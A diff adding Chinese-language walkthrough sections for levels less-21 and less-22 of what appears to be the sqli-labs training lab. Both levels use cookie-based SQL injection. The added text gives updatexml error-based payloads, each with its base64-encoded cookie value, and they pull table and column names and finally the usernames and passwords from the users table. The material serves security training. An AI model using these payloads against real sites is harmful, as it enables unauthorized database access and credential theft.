@@ -1009,3 +1009,50 @@ Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(col
 Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1) #
 ```
 
+
+
+### less-21
+
+这一关还是cookie注入，通过admin账户登录进去，可以发现cookie的值uname是一串经过base64编码的字符串，这里注入需要将注入的sql语句转为base64编码
+
+注入点探测：
+
+```
+#uname=admin'
+Cookie: uname=YWRtaW4n
+```
+
+通过报错信息可以发现cookie的值是由单引号加一个圆括号闭合的，所以需要将这两者闭合
+
+payload:
+
+```
+# admin') and updatexml(1,concat(0x7e,database(),0x7e),1)#
+uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSM=
+# admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM=
+# admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),1)#
+uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0idXNlcnMiKSwweDdlKSwxKSM=
+# admin') and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1)#
+uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2Usc3Vic3RyKChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4M2EscGFzc3dvcmQpIGZyb20gdXNlcnMpLDEsMTApLDB4N2UpLDEpIw==
+```
+
+
+
+### less-22
+
+这一关和上一关类似，都是cookie注入，cookie也是被base64编码了的，测试后这一关需要闭合双引号，payload和less-21类似
+
+payload:
+
+```
+# admin" and updatexml(1,concat(0x7e,database(),0x7e),1)#
+uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIw==
+# admin" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw==
+# admin" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),1)#
+uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSJ1c2VycyIpLDB4N2UpLDEpIw==
+# admin" and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1)#
+uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxzdWJzdHIoKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyksMSwxMCksMHg3ZSksMSkj
+```
+
